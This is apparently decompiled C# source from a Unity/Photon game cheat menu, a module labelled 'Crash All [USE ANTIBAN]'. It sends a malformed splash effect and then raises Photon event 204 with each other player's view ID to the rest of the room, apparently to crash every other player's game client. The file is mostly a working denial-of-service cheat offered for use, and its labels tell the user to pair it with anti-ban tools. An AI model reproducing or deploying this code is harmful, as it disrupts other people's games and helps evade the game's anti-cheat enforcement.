// Processed with MiDeobf Engine v2.1.2rc (14/08/26)
// discord.gg/wyvern
// https://wyvern.im

// Type: Rexon_Menu.Core.Modules.ExperimentalOverpowered.CrashAllDETECTED
// Assembly: Rexon_Menu, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null

using System.Linq;
using ExitGames.Client.Photon;
using Photon.Pun;
using Photon.Realtime;
using Recovered.Obfuscated;
using Rexon_Menu.Core.Attributes;
using Rexon_Menu.Interface;
using UnityEngine;

using Object = UnityEngine.Object;

namespace Rexon_Menu.Core.Modules.ExperimentalOverpowered;

[Mod("Crash All [USE ANTIBAN]", "Experimental Overpowered [D?]", "Crashes all players.", true, 13, ModType.Action, false)]
internal class CrashAllDETECTED : MonoBehaviour
{
	private void OnEnable()
	{
		if (!IsSupportedRoom())
		{
			Object.Destroy(this);
			return;
		}

		GameNetworkUtilities.SendMalformedSplashEffect();
		foreach (Player target in PhotonNetwork.PlayerListOthers)
		{
			if (Main.SelectedPlayers.Contains(target))
			{
				continue;
			}

			Main.SelectedPlayers.Add(target);
			VRRig rig = RigUtilities.GetRig(target);
			PhotonView view = rig != null ? RigUtilities.GetPhotonView(rig) : null;
			if (view == null || view.Owner == null)
			{
				continue;
			}

			int[] recipients = PhotonNetwork.PlayerList
				.Where(player => player.ActorNumber != target.ActorNumber)
				.Select(player => player.ActorNumber)
				.ToArray();
			if (recipients.Length == 0)
			{
				continue;
			}

			Hashtable payload = new Hashtable { { (byte)0, view.ViewID } };
			PhotonNetwork.NetworkingClient.OpRaiseEvent(
				204,
				payload,
				new RaiseEventOptions { TargetActors = recipients },
				SendOptions.SendReliable);
		}

		Object.Destroy(this);
	}

	private static bool IsSupportedRoom()
	{
		if (!PhotonNetwork.InRoom || PhotonNetwork.CurrentRoom == null)
		{
			return false;
		}
		object gameMode = PhotonNetwork.CurrentRoom.CustomProperties["gameMode"];
		return gameMode != null && gameMode.ToString().Contains("MODDED_");
	}
}
